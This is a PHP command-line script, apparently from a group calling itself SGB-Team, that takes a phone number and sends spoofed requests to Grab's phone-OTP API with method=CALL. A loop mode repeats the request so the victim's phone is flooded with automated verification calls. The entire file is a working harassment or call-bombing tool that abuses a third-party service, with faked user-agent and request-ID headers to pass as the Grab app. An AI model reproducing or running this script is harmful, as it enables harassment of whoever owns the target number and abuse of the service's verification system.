<?php

function getInput()
{
    return trim(fgets(STDIN));
}

class PrankCall
{
    private $number;

    public function __construct($no)
    {
        $this->number = $no;
    }

    private function correct($no)
    {
        if (substr($no, 0, 2) == "08") {
            $no = "62" . substr($no, 1);
        }
        return $no;
    }

    private function executeCall()
    {
        $no = $this->correct($this->number);
        $rand = rand(123456, 9999999);
        $rands = $this->generateRandomString(12);
        $post = "method=CALL&countryCode=id&phoneNumber=$no&templateID=pax_android_production";

        $headers = [
            "x-request-id: ebf61bc3-8092-4924-bf45-$rands",
            "Accept-Language: in-ID;q=1.0, en-us;q=0.9, en;q=0.8",
            "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)",
            "Content-Type: application/x-www-form-urlencoded",
            "Content-Length: " . strlen($post),
            "Host: api.grab.com",
            "Connection: close"
        ];

        $ch = curl_init("https://api.grab.com/grabid/v1/phone/otp");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $response = curl_exec($ch);
        curl_close($ch);

        $result = json_decode($response, true);
        echo empty($result['challengeID']) ? "Gagal\n" : "Sukses\n";
    }

    private function loopCalls($count, $sleep = null)
    {
        $count = (int) $count;
        $successCount = 0;
        $no = $this->correct($this->number);

        while ($successCount < $count) {
            $rand = rand(123456, 9999999);
            $rands = $this->generateRandomString(12);
            $post = "method=CALL&countryCode=id&phoneNumber=$no&templateID=pax_android_production";

            $headers = [
                "x-request-id: ebf61bc3-8092-4924-bf45-$rands",
                "Accept-Language: in-ID;q=1.0, en-us;q=0.9, en;q=0.8",
                "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)",
                "Content-Type: application/x-www-form-urlencoded",
                "Content-Length: " . strlen($post),
                "Host: api.grab.com",
                "Connection: close"
            ];

            $ch = curl_init("https://api.grab.com/grabid/v1/phone/otp");
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            $response = curl_exec($ch);
            curl_close($ch);

            $result = json_decode($response, true);
            if (!empty($result['challengeID'])) {
                $successCount++;
                echo "[$successCount] Sukses\r";
            }

            if ($sleep !== null) sleep($sleep);
        }
        echo "\nCompleted!\n";
    }

    private function generateRandomString($length)
    {
        $characters = "abcdefghijklmnopqrstuvwxyz1234567890";
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, strlen($characters) - 1)];
        }
        return $randomString;
    }

    public function run()
    {
        echo "?Loop (y/n): ";
        $loop = trim(getInput());

        if ($loop === "y") {
            echo "?How many calls: ";
            $many = getInput();
            $this->loopCalls($many);
        } else {
            $this->executeCall();
        }
    }
}

echo "#################################\n";
echo "# Copyright : @xptra | SGB-Team #\n";
echo "#################################\n";
echo "?Phone Number: ";
$no = getInput();
$prank = new PrankCall($no);
$prank->run();
